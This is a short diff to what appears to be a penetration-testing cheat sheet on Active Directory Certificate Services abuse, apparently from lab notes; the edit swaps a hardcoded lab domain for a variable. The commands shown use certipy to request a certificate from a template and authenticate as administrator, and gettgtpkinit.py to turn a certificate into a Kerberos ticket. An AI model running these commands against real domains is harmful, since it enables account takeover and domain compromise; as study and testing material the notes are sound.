@@ -109,7 +109,7 @@ certipy- auth -pfx administrator.pfx
 certipy req -u $username -p $password -ca $ca -target $domain -template $template -dc-ip $IP -key-size 4096
 ```
 ```bash
-python3 gettgtpkinit.py -cert-pfx $pfx_file vigilant.vl/$username $ccache_file -dc-ip $IP -v
+python3 gettgtpkinit.py -cert-pfx $pfx_file $domain/$username $ccache_file -dc-ip $IP -v
 ```
 ## Resources
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
